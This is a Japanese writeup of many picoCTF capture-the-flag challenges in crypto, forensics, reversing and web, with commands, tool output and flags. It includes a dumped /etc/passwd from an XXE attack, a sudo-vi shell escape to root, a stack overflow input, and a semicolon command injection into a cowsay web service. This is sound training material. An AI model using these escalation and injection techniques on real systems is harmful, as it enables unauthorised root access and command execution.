Invalid ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flask:x:999:999::/app:/bin/sh picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}
```

これでflagが得られた。

`picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}`

### MatchTheRegex (web, 100)

入力欄がついたページが与えられるが、何をどんな形式で入力すればいいかがわからない。正規表現ということで`.*`や`/.*/`, `/^.*$/`を入力してみたが、どうやら正解ではない模様。

ソースコードを見ると次のような記載があった。

```js
function send_request() {
  let val = document.getElementById("name").value;
  // ^p.....F!?
  fetch(`/flag?input=${val}`)
    .then(res => res.text())
    .then(res => {
      const res_json = JSON.parse(res);
      alert(res_json.flag)
      return false;
    })
  return false;
}
```

コメントに`^p.....F!?`と書いてあったので、まさかと思い`picoCTF`と入力したところ正解だった。なんで？
後で試したところ`p.....F`や`p....TF`, `p.....F!`, `picoCTF{xxx}`は通ったが、`p....T.`は通らなかった。そのため、おそらく`/^p.....F!?/`にヒットするような文字列（pから始まり、7文字目にFが入る文字列）を渡せば何でも正解できると思う。

`picoCTF{succ3ssfully_matchtheregex_9080e406}`

### morse-code (crypto, 100)

モールス信号を解読する問題。音声を聞いてモールス信号を文字列に直し、CyberChefなどで元の文字列に直せばよい。

`picoCTF{wh47_h47h_90d_w20u9h7}`

### It is my Birthday (web, 100)

md5が衝突する2つのpdfファイルを送信することでflagが得られる。ただし、

- 必ずしもpdfファイルである必要はなく、拡張子が`.pdf`であればよい
  - 問題には書いてないが、試しにやってみたらできた
- md5ハッシュの衝突は簡単に起こせる
  - 例：HashClashというツールを使う

以上のように、この問題で提出する必要があるファイルを用意するのはそこまで難しくない。というかmd5が一致する文字列の例がネット上で公開されているため、面倒な場合はそれをそのまま流用すればよい。

今回は<https://burion.net/entry/2024/01/12/012723>で紹介されていた<https://github.com/buri83/blog-assets/tree/main/attack-md5/cpc-demo>というリポジトリから、`prefix-1.col`と`prefix-2.col`を拝借した。拡張子を`.pdf`に直してから2つのファイルを提出すると、サイトのphpソースコードが読めるようになった。そこにflagが書かれている。

```php
// FLAG: picoCTF{c0ngr4ts_u_r_1nv1t3d_aad886b9}
```

なお、このソースコードより、flagを得るには

- ファイルサイズが大きすぎない
- ファイルタイプが"application/pdf"
- 2つのファイルの内容が異なる
- 2つのファイルのmd5ハッシュが一致する

という条件を全て満たす必要があることもわかる。思ったよりゆるい制限だった。

### substitution0 (Crypto, 100)

アルファベットの置換によって暗号を解読する問題。暗号文の上部に`ZGSOCXPQUYHMILERVTBWNAFJDK`と書いてあるので、試しにCyberChefの`Substitute`を用いて、`ZGSOCXPQUYHMILERVTBWNAFJDK`をそれぞれ`ABCDEFGHIJKLMNOPQRSTUVWXYZ`で置換してみる。すると解読でき、flagが得られた。  

`The flag is: picoCTF{5UB5717U710N_3V0LU710N_357BF9FF}`

### substitution1 (crypto, 100)

これも置換するだけだが、即座に答えにたどり着くことはできない。`bzskSYT -> picoCTF`や`yar thjm ze -> the flag is`のように順次置換を繰り返すことでflagを得ることができる。  
最終的に、`uwgvl bzskSYT thjm yar ze nd xocq`の各文字をそれぞれ`qvwkb picoCTF flag the is ur mynd`に置換することで、flagが出現した。

```txt
CTFs (short for capture the flag) are a type of computer security competition. Contestants are presented with a set of challenges which test their creativity, technical (and googling) skills, and problem-solving ability. Challenges usually cover a number of categories, and when solved, each yields a string (called a flag) which is submitted to an online scoring service. CTFs are a great way to learn a wide array of computer security skills in a safe, legal environment, and are hosted and played by many security groups around the world for fun and practice. For this problem, the flag is: picoCTF{FR3QU3NCY_4774CK5_4R3_C001_7AA384BC}
```

### substitution2 (crypto, 100)

スペースやピリオドがないので解読が難しい。ヒントに頻度分析を使うとよいと書かれていたため、実践する。  
見てすぐに分かる部分、つまり`qcuhUIE`を`picoCTF`に置換したのちに頻度分析を行う。結果は以下の通りとなった。

```txt
61	a	2.55%   	|||
62	b	3.17%   	||||
63	c	4.80%   	|||||
64	d	1.86%   	||
66	f	7.51%   	||||||||
67	g	2.63%   	|||
69	i	7.97%   	||||||||
6a	j	1.16%   	||
6b	k	7.43%   	||||||||
6d	m	5.26%   	||||||
6e	n	13.47%  	||||||||||||||
6f	o	8.59%   	|||||||||
70	p	2.55%   	|||
72	r	1.39%   	||
73	s	4.33%   	|||||
74	t	16.02%  	|||||||||||||||||
76	v	0.15%   	|
77	w	0.70%   	|
78	x	3.56%   	||||
7a	z	1.55%   	||
```

> E	13%  
> T, A, O, N, I, R, S, H	9%〜6%  
> D, L, U, C, M	4%〜3%  
> P, F, Y, W, G, B, V	2%〜1%  
> K, X, J, Q, Z	0.5%〜0.1%  
> 引用元：<https://tex2e.github.io/blog/crypto/letter-frequency>

一般的に`E`の出現頻度が最も高いとのことなので、まだ置換していない文字の中で最も出現頻度が高い`N`を`E`と置換してみた。  
すると`tse`という文字列が非常に多く含まれることがわかったので、`the`と推測し`s -> h`と置換。   
さらに末尾は`the flag is picoCTF`になりそうなので`isn exmd ct -> the flag is`と置換する。  
すると前半に`highschool`という文字列が浮かぶので、その後に続く単語を地道に推測していく。おそらく`highschool computer security competitions`だと思われるため、置換。

ここまでくればほとんどの単語が解読できる。あとはスペースを追加しながら、残った文字の置換を進めていくだけである（ここが一番面倒）。  
最終的に`qcuhUIEnsexmdtuhgqbinfrkajzpov`の各文字を`picoCTFehflagscomputeryndbvxkq`に置換することで暗号を解読することができた（一部置換忘れがあるかも）。

```txt
there exist several other well established highschool computer security competitions including cyber patriot and us cyber challenge these competitions focus primarily on systems administration fundamentals which are very useful and marketable skills however we believe the proper purpose of a highschool computer security competition is not only to teach valuable skills but also to get students interested in and excited about computer science defensive competitions are often laborious affairs and come down to running checklists and executing config scripts offense on the other hand is heavily focused on exploration and improvisation and often has elements of play we believe a competition touching on the offensive elements of computer security is therefore a better vehicle for techevangelism to students in american highschools further we believe that an understanding of offensive techniques is essential for mounting an effective defense and that the tools and configuration focus encountered in defensive competitions does not lead students to know their enemy as effectively as teaching them to actively think like an attacker picoctf is an offensively oriented highschool computer security competition that seeks to generate interestin computer science among highschoolers teaching them enough about computer security to pique their curiosity motivating them to explore on their own and enabling them to better defend their machines the flag is picoCTF{N6R4M_4N41Y515_15_73D10U5_702F03FC}
```

### Pixelated (crypto, 100)

2つの画像が与えられる。これらを重ねればよいと考えてPowerPointで（透明度を上げたうえで）重ねてみたが、何も出てこなかった。

わからずwriteupを見ると、ただ重ねるのではなく、画像の加算処理（ADD）を行う必要があるとのこと。`StegSolve`を使うといいとも聞いたので、これを使って2枚の画像をADDしたところ、flagを得ることができた。  
※StegSolveを起動して`File`から1枚目の画像を開き、その後`Analyze -> Image Combiner`で2枚目の画像を指定すると、画像の演算が可能となる。

`picoCTF{d72ea4af}`

### transposition-trial (crypto, 100)

与えられた文字列を3文字ごとに区切り、それぞれをローテーションする、つまり例えば"123"を"312"と置換することによって解読できる。手作業でもいいが、作成したPythonスクリプトを以下に示す。

```python
cipher: str = "heTfl g as iicpCTo{7F4NRP051N5_16_35P3X51N3_V6E5926A}4"

message: str = ""
for i in range(len(cipher) // 3):
  tmp: str = cipher[i*3:(i+1)*3]
  message += tmp[2] + tmp[0:2]
  
print(message)
```

これを実行するとflagが得られる。

```terminal
$ python3 decrypt.py
The flag is picoCTF{7R4N5P051N6_15_3XP3N51V3_56E6924A}
```

### two-sum (binary, 100)

`n1 > n1 + n2`か`n2 > n1 + n2`を満たす正の整数n1, n2を入力する問題。  
そうした整数は数学の世界では存在しないが、プログラムの世界ではオーバーフローが原因で存在しうる。

プログラムを実行して適当な数を入力してみると、3000000000ではオーバーフローするが、2000000000では何も起こらなかった。そのため内部的にint型が使用されていると推測できる（ソースコードにもintを使用していることが記されている）。  
そのうえで`n1 > n1 + n2`を満たすn1, n2を考え、入力すればflagが得られる。

```terminal
$ nc saturn.picoctf.net 56194
n1 > n1 + n2 OR n2 > n1 + n2
What two positive numbers can make this possible:
2000000000
2000000000
You entered 2000000000 and 2000000000
You have an integer overflow
YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_76f333c8}
```

### credstuff (crypto, 100)

cultirisというユーザに対応するパスワードを確認すると、`cvpbPGS{P7e1S_54I35_71Z3}`と記されていたため、これにROT13をかけるとflagが得られた。

`picoCTF{C7r1F_54V35_71M3}`

### useless (general, 100)

```terminal
picoplayer@challenge:~$ man useless

useless
     useless, — This is a simple calculator script

SYNOPSIS
     useless, [add sub mul div] number1 number2

DESCRIPTION
     Use the useless, macro to make simple calulations like addition,subtraction, multiplication and division.

Examples
     ./useless add 1 2
       This will add 1 and 2 and return 3

     ./useless mul 2 3
       This will return 6 as a product of 2 and 3

     ./useless div 6 3
       This will return 2 as a quotient of 6 and 3

     ./useless sub 6 5
       This will return 1 as a remainder of substraction of 5 from 6

Authors
     This script was designed and developed by Cylab Africa

     picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_5657}
```

### Permissions (general, 100)

問題タイトルよりパーミッションに関係する問題だと踏み、`sudo -l`を実行してみる。

```terminal
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

なお`sudo -ll`を実行すると、もう少しわかりやすい出力になる。

```terminal
picoplayer@challenge:~$ sudo -ll
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:

Sudoers entry:
    RunAsUsers: ALL
    Commands:
        /usr/bin/vi
```

これより、`vi`を任意のユーザとして実行することができるとわかった。つまりroot権限でviを実行できるということである。  
これを悪用し、[GTFOBins](https://gtfobins.github.io/gtfobins/vi/#sudo)に書かれていた手法を用いると、管理者権限シェルを奪取することに成功した。あとは`/root`にあるflagを表示するだけである。

```terminal
picoplayer@challenge:~$ sudo vi -c ':!/bin/sh' /dev/null
[sudo] password for picoplayer:

# cd /
# ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
# cd root
# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Apr 10 12:07 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
```

もしくは、viを管理者権限で実行したのちに`:term`コマンドを実行してもよい。この方法でも管理者権限でターミナルを開くことができる。

### Reverse (rev, 100)

正直`strings`を使えば解ける。

```txt
$ strings ret
（中略）
Enter the password to unlock this file:
You entered: %s
Password correct, please see flag: picoCTF{3lf_r3v3r5ing_succe55ful_9ae85289}
Access denied
```

しかし、ここは正攻法で、`objdump`と`gdb`を使って解いてみようと思う。

まず`objdump`でパスワードの照合処理の場所を調べる。

```terminal
00000000000011c9 <main>:
    11c9:       f3 0f 1e fa             endbr64
    （中略）
    1249:       b8 00 00 00 00          mov    $0x0,%eax
    124e:       e8 7d fe ff ff          call   10d0 <__isoc99_scanf@plt>
    1253:       48 8d 45 a0             lea    -0x60(%rbp),%rax
    1257:       48 89 c6                mov    %rax,%rsi
    125a:       48 8d 3d d3 0d 00 00    lea    0xdd3(%rip),%rdi        # 2034 <_IO_stdin_used+0x34>
    1261:       b8 00 00 00 00          mov    $0x0,%eax
    1266:       e8 45 fe ff ff          call   10b0 <printf@plt>
    126b:       48 8d 55 d0             lea    -0x30(%rbp),%rdx
    126f:       48 8d 45 a0             lea    -0x60(%rbp),%rax
    1273:       48 89 d6                mov    %rdx,%rsi
    1276:       48 89 c7                mov    %rax,%rdi
    1279:       e8 42 fe ff ff          call   10c0 <strcmp@plt>
    127e:       85 c0                   test   %eax,%eax
    1280:       75 1a                   jne    129c <main+0xd3>
    （後略）
```

これより、`0x124e`で`scanf`関数が呼ばれて入力を受け付け、`0x1279`で`strcmp`関数が呼ばれて入力とパスワードを比較していることがわかる。

`strcmp`呼び出し直前のレジスタには、入力とパスワードが格納されているはずである。そのため、次に`gdb`を用いてレジスタの内容を確認する。  
※引数はrdi, rsi, rdx, …の順でレジスタに格納されている。

```terminal
$ gdb ret
GNU gdb (Debian 13.2-1) 13.2

（中略）

(gdb) b main
Breakpoint 1 at 0x11d1
(gdb) r
Starting program: /mnt/c/Users/XXX/ret
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x00005555555551d1 in main ()
(gdb) disas
Dump of assembler code for function main:
   0x00005555555551c9 <+0>:     endbr64
   0x00005555555551cd <+4>:     push   %rbp
   0x00005555555551ce <+5>:     mov    %rsp,%rbp
=> 0x00005555555551d1 <+8>:     sub    $0x60,%rsp
   0x00005555555551d5 <+12>:    mov    %fs:0x28,%rax
（中略）
   0x0000555555555276 <+173>:   mov    %rax,%rdi
   0x0000555555555279 <+176>:   call   0x5555555550c0 <strcmp@plt>
   0x000055555555527e <+181>:   test   %eax,%eax
（中略）
   0x00005555555552c2 <+249>:   ret
End of assembler dump.
(gdb) b *0x0000555555555279
Breakpoint 2 at 0x555555555279
(gdb) c
Continuing.
Enter the password to unlock this file: hoge
You entered: hoge

Breakpoint 2, 0x0000555555555279 in main ()
(gdb) i r
rax            0x7fffffffde80      140737488346752
rbx            0x7fffffffdff8      140737488347128
rcx            0x0                 0
rdx            0x7fffffffdeb0      140737488346800
rsi            0x7fffffffdeb0      140737488346800
rdi            0x7fffffffde80      140737488346752
rbp            0x7fffffffdee0      0x7fffffffdee0
rsp            0x7fffffffde80      0x7fffffffde80
r8             0x73                115
r9             0x1                 1
r10            0x0                 0
r11            0x202               514
r12            0x0                 0
r13            0x7fffffffe008      140737488347144
r14            0x0                 0
r15            0x7ffff7ffd000      140737354125312
rip            0x555555555279      0x555555555279 <main+176>
eflags         0x206               [ PF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) x/s $rdi
0x7fffffffde80: "hoge"
(gdb) x/s $rsi
0x7fffffffdeb0: "picoCTF{3lf_r3v3r5ing_succe55ful_9ae8528"
```

これでパスワードがわかったので、`ret`を実行して入力してみる。

```terminal
$ ./ret
Enter the password to unlock this file: picoCTF{3lf_r3v3r5ing_succe55ful_9ae8528
You entered: picoCTF{3lf_r3v3r5ing_succe55ful_9ae8528
Password correct, please see flag: picoCTF{3lf_r3v3r5ing_succe55ful_9ae85289}
picoCTF{3lf_r3v3r5ing_succe55ful_9ae8528
```

こうして正攻法でflagが得られた。

### Safe Opener 2 (rev, 100)

正攻法ではないが、`strings`で解ける。

```terminal
$ strings SafeOpener.class | grep pico
,picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_de45efd6}
```

ヒントによると想定解はデコンパイラを利用することらしいので、やってみる。次のサイトにclassファイルを送信することでデコンパイルできた。  
<https://www.decompiler.com/jar/1b1cbad2675446159b66331788770d39/SafeOpener.java>

`openSafe()`でflagとの照合処理が行われているので、ここからflagを得ることができる。

```java
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Base64;
import java.util.Base64.Encoder;

public class SafeOpener {
   public static void main(String[] args) throws IOException {
      BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in));
      Encoder encoder = Base64.getEncoder();
      String encodedkey = "";
      String key = "";

      for(int i = 0; i < 3; ++i) {
         System.out.print("Enter password for the safe: ");
         key = keyboard.readLine();
         encodedkey = encoder.encodeToString(key.getBytes());
         System.out.println(encodedkey);
         boolean isOpen = openSafe(encodedkey);
         if (isOpen) {
            break;
         }

         System.out.println("You have  " + (2 - i) + " attempt(s) left");
      }

   }

   public static boolean openSafe(String password) {
      String encodedkey = "picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_de45efd6}";
      if (password.equals(encodedkey)) {
         System.out.println("Sesame open");
         return true;
      } else {
         System.out.println("Password is incorrect\n");
         return false;
      }
   }
}
```

### rotation (crypto, 100)

ROT18で解ける。CyberChefのリンク → <https://cyberchef.org/#recipe=ROT13(true,true,false,18)&input=eHFrd0tCTnt6MGJpYjF3dl9sM2t6Z3hiM2xfaTRqN2w3NTl9>

`picoCTF{r0tat1on_d3crypt3d_a4b7d759}`

### ReadMyCert (crypto, 100)

自分の環境ではcrtファイルを開けるアプリケーションがなかったため、テキストエディタで開くとBase64らしき文字列が書かれていた。これをデコードしたところflagが得られた。

`picoCTF{read_mycert_57f58832}`

### rail-fence (crypto, 100)

文字をジグザグに配置したいが、各行の文字数がわからないのでまずはそれを求める。

1サイクル6文字として考えると、暗号文は56文字、つまり6文字を9サイクル繰り返して2文字残るので、以下のように図示できる。

```txt
|---1--|---2--| ... |---n--|

|o     |o     |     |o     |o
| o   o| o   o| ... | o   o| o
|  o o |  o o |     |  o o |
|   o  |   o  |     |   o  |
```

ここでnを求めたい。各行の文字数は

1. n
2. 2(n - 1) + 1
3. 2(n - 1)
4. n - 1

なので、総文字数は`6n - 4`となる。先ほど述べた通り暗号文は56文字からなるので、`6n - 4 = 56` ⇔ `n = 10`であり、各行の文字数は

1. 10文字
2. 19文字
3. 18文字
4. 9文字

となる。この通りに暗号文を改行で区切り、ジグザグになるように見た目を整えることで暗号文を解読でき、flagが得られる。

```txt
Ta _7N6D49
hlg:W3D_H3C31N__A97
ef sHR053F38N43D7B
 i33___N6
 
↓

T     a           _     7     N     6     D     4     9
 h   l g   : W   3 D   _ H   3 C   3 1   N _   _ A   9 7 
  e f     s   H R   0 5   3 F   3 8   N 4   3 D   7 B   
         i     3     3     _     _     _     N     6     

↓

The flag is: WH3R3_D035_7H3_F3NC3_8361N_4ND_3ND_4A76B997 

↓

picoCTF{WH3R3_D035_7H3_F3NC3_8361N_4ND_3ND_4A76B997}
```

### Local Target (binary, 100)

gdb（gef）を使ってleave直前のスタックの状態を確認すると以下のようになっていた。なお、入力には`AAAAAAAAAAAAAAAA`（Aが16個）を使用している。

```txt
0x00007fffffffdec0│+0x0000: "AAAAAAAAAAAAAAAA"   ← $rsp
0x00007fffffffdec8│+0x0008: "AAAAAAAA"
0x00007fffffffded0│+0x0010: 0x0000000000000000
0x00007fffffffded8│+0x0018: 0x00007fff00000040 ("@"?)
0x00007fffffffdee0│+0x0020: 0x0000000000000001   ← $rbp
0x00007fffffffdee8│+0x0028: 0x00007ffff7dff6ca  →  <__libc_start_call_main+122> mov edi, eax
0x00007fffffffdef0│+0x0030: 0x00007fffffffdfe0  →  0x00007fffffffdfe8  →  0x00007ffff7fc3160  →  0x00007ffff7dd8000  →  0x03010102464c457f
0x00007fffffffdef8│+0x0038: 0x0000000000401236  →  <main+0> endbr64
```

これを見るに、`0x00007fffffffded8`（の下位1バイト）が`0x40`、つまりint型変数`num`を指していることがわかる。バッファオーバーフローを用いてこの値を書き換えてやればよい。

```txt
$ echo -e "AAAAAAAAAAAAAAAABBBBBBBB\x41" | nc saturn.picoctf.net 51269
Enter a string:
num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_ee58441a}
```

## 101~149pt

### Disk, disk, sleuth! (forensics, 110)

`srch_strings`コマンドを使ってディスクイメージからflagを見つける問題であるが、`srch_strings`でなくても`strings`コマンドでいいのではと思ってしまう（`srch_strings`の`man`を見ても関連項目に`strings`あるし）。
少なくともこの問題においては`strings`で事足りる。

解き方としては、`strings`で文字列を抽出してから`grep`などでflagを見つければよい。よくある問題である。

### MilkSlap (forensics, 120)

与えられたWebページに非常に大きな画像ファイルがあり、これ以外はとくに不審なところもないことから、この画像が鍵になっていると推測できる。
binwalkやfileを使ったが解けず、断念。writeupを見ると`zsteg`を用いてBit Planeを見ればよいとのこと。数日前にもBitPlaneを使う問題を解いたはずが思いつかなかった…
`zsteg`は次のようにしてインストールできる。

```sh
sudo apt install ruby-rubygems
sudo gem install zsteg
```

なお、今回の画像に対してzstegを使おうとするとエラーが出るが、[これは画像が大きすぎるのが問題である](https://github.com/zed-0xff/zsteg/issues/30)。次のようにすれば実行できる。

```sh
$ RUBY_THREAD_VM_STACK_SIZE=500000000 zsteg concat_v.png
imagedata           .. text: "\n\n\n\n\n\n\t\t"
b1,b,lsb,xy         .. text: "picoCTF{imag3_m4n1pul4t10n_sl4p5}\n"
b1,bgr,lsb,xy       .. <wbStego size=9706075, data="\xB6\xAD\xB6}\xDB\xB2lR\x7F\xDF\x86\xB7c\xFC\xFF\xBF\x02Zr\x8E\xE2Z\x12\xD8q\xE5&MJ-X:\xB5\xBF\xF7\x7F\xDB\xDFI\bm\xDB\xDB\x80m\x00\x00\x00\xB6m\xDB\xDB\xB6\x00\x00\x00\xB6\xB6\x00m\xDB\x12\x12m\xDB\xDB\x00\x00\x00\x00\x00\xB6m\xDB\x00\xB6\x00\x00\x00\xDB\xB6mm\xDB\xB6\xB6\x00\x00\x00\x00\x00m\xDB", even=true, mix=true, controlbyte="[">
b2,r,lsb,xy         .. text: ["U" repeated 8 times]
b2,r,msb,xy         .. file: VISX image file
b2,g,lsb,xy         .. file: VISX image file
b2,g,msb,xy         .. file: SoftQuad DESC or font file binary - version 15722
b2,b,msb,xy         .. text: "UfUUUU@UUU"
b4,r,lsb,xy         .. text: "\"\"\"\"\"#4D"
b4,r,msb,xy         .. text: "wwww3333"
b4,g,lsb,xy         .. text: "wewwwwvUS"
b4,g,msb,xy         .. text: "\"\"\"\"DDDD"
b4,b,lsb,xy         .. text: "vdUeVwweDFw"
b4,b,msb,xy         .. text: "UUYYUUUUUUUU"
```

`picoCTF{imag3_m4n1pul4t10n_sl4p5}`

### Disk, disk, sleuth! II (forensics, 130)

imgファイルが与えられるので、これをAutopsyに突っ込んで「ファイルビュー」→「ファイルタイプ」→「拡張子別」→「文書」→「プレーンテキスト」に行くと`down-at-the-bottom.txt`が得られる。

```txt
  / \   / \   / \   / \   / \   / \   / \   / \   / \   / \   / \   / \   / \
 ( p ) ( i ) ( c ) ( o ) ( C ) ( T ) ( F ) ( { ) ( f ) ( 0 ) ( r ) ( 3 ) ( n )
  \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/
   _     _     _     _     _     _     _     _     _     _     _     _     _
  / \   / \   / \   / \   / \   / \   / \   / \   / \   / \   / \   / \   / \
 ( s ) ( 1 ) ( c ) ( 4 ) ( t ) ( 0 ) ( r ) ( _ ) ( n ) ( 0 ) ( v ) ( 1 ) ( c )
  \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/
   _     _     _     _     _     _     _     _     _     _     _
  / \   / \   / \   / \   / \   / \   / \   / \   / \   / \   / \
 ( 3 ) ( _ ) ( f ) ( 5 ) ( 5 ) ( 6 ) ( 5 ) ( e ) ( 7 ) ( b ) ( } )
  \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/
```

`picoCTF{f0r3ns1c4t0r_n0v1c3_f5565e7b}`

## 150pt

### extensions (forensics, 150)

ダウンロードしたファイルを`file`コマンドで調べると、PNG画像であるとわかる。
※これはファイルの先頭に`PNG`と書かれていることからもわかる。

あとは拡張子を`.png`にして画像ビューワで開けばよい。

### So Meta (forensics, 150)

（多分想定解は画像のメタデータを見ることだと思う）

grepで調べたらflagが見つかった。
`cat pico_img.png | grep "pico"`だとエラーが出るので、`cat pico_img.png | strings | grep "pico"`のようにしたら実行できた。

### What Lies Within (forensics, 150)

`file`で調べてもおかしな点はないし、上問と同様にgrepで調べてもflagは見つからない。
それならbinwalkを使うのかもと思い試す。

しかしzlib形式のファイルを解凍する方法が見つからない。いろいろ調べると、そもそもPNGの画像データはzlibで圧縮されているらしく、つまりbinwalkでPNG画像を解析してzlibファイルが出てくるのは当たり前のようだ。

振出しに戻ってしまった。もうわからないのでwriteupを見る。

...

画像データを数ビット書き換え、そこにデータを埋め込む手法があるらしく、この問題ではその手法が使われているらしい。
そのため[Steganography Online](https://stylesuxx.github.io/steganography/)などでデコードすればflagが得られる。

<https://note.com/misoterasu/n/n055da5e55fa6>

この手法について詳しくは以下リンク参照。

<https://digitaltravesia.jp/usamimihurricane/webhelp/_RESOURCE/MenuItem/another/anotherAboutSteganography.html>

### shark on wire 1 (forensics, 150)

wiresharkでパケットを見る。よく出てくるLLMNRやSSDPがなにか関係しているのではと思ったが手がかりは得られず。

適当に眺めていると、ある連続したUDPパケットのDataに`C`、`T`、`F`と書かれていることに気づいた。その前後のUDPパケットにも、1文字ずつp、i、c、oと書かれたものを見つけた。

というわけで、WireSharkの検索機能を使ってLEN=1のUDPパケットのみを絞り込む。
検索窓に`udp && len(data) == 1`と入れれば絞り込める。
参考: <https://www.softech.co.jp/mm_190807_tr.htm>

そのようにフィルターをかけたところ、送信元が`10.0.0.2`のパケットのみにflagが記載されているようだったので、さきほどの検索クエリに`&& ip.src == 10.0.0.2`を付け足し、さらに絞り込んだ。

また、複数の宛先に同じデータを送っているようだったので、検索クエリに`&& ip.dst == 10.0.0.12`を追加し、送信先を`10.0.0.12`のみに絞り込んだ。

以上のフィルターをかけたあと、パケットのDataに含まれる文字を順に1文字ずつつなげたところ、flagが得られた。
（ちなみに`10.0.0.13`に絞り込むと、`picoCTF{N0t_a_fLag}`という文字列が得られる。要するに失敗である）
手動でつなげようとしたが面倒だったので、UDPストリームの追跡機能を用いた。適当なパケットを右クリックして「追跡」→「UDPストリーム」を押すことで、自動でまとめてくれる。
参考: <https://studyinfra.net/wireshark/howto-extract-datapart/>

### caas (web, 150)

`https://caas.mars.picoctf.net/cowsay/適当な文字列`にアクセスすると、牛がその文字列を話しているAAが表示される。
問題文にあった`index.js`を読むと、サーバ上のコンソールで`/usr/games/cowsay 与えた文字列`というコマンドが実行されているようだ。つまり文字列`aaa`を渡すと`/usr/games/cowsay aaa`が実行される。

さて、Linuxのターミナルでは、あるコマンドを実行後に別のコマンドを実行する方法として、セミコロン`;`で区切るという手法がある。

これを悪用して、文字列`a ; ls`を与えるとどうなるだろう。
実行するコマンドはおそらく`/usr/games/cowsay a ; ls`となる。つまり`/usr/games/cowsay a`が実行されたあと、`ls`が実行される。
実際にその文字列を渡した`https://caas.mars.picoctf.net/cowsay/a ; ls`にアクセスしてみると、想像通り以下内容が表示された。

```sh
 ___
< a >
 ---
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```

`falg.txt`を閲覧するために`cat`を用いて`https://caas.mars.picoctf.net/cowsay/a ; cat falg.txt`にアクセスすると、flagが得られる。

（注意）
スラッシュが入るコマンド、たとえば`ls ../usr/game`などはそのままでは実行できない。そのため、スラッシュをURLエンコードした`%2F`に置換する必要がある。今の例では`ls ..%2Fusr%2Fgame`とすれば実行できるようになる。

## 200pt

### picobrowser (web, 200)

curlを使用。`man curl`でcurlのオプションを調べると、`-A`でuserAgentを変更できるそうなので、`curl -A "picobrowser" http://jupyter.challenges.picoctf.org/flag`のようにすればuserAgentを偽装した際のソースが得られる。そこにflagが書かれている。

### Client-side-again (web, 200)

ログインページを攻略する問題。フォームに認証情報を書き、verifyボタンを押すと認証が行われ、成功失敗が判断される。
ボタンを押した際の処理はindex.htmlの20行目にあるように、`verify()`という関数を呼び出すことで行われているようだ。

その`verify()`はどこで定義されているのかというと、index.htmlの10行目に記述されたjavascriptコード内で定義されている。
一行で書かれていて見にくいため、VS Codeのフォーマット機能を用いて見やすく整形したところ、以下のようなコードが見つかった。

```javascript
function verify() {
    checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];
    split = 0x4;
    if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3')) {
        if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n') {
            if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4')) {
                if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT') {
                    if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5')) {
                        if (checkpass['substring'](0x6, 0xb) == 'F{not') {
                            if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6')) {
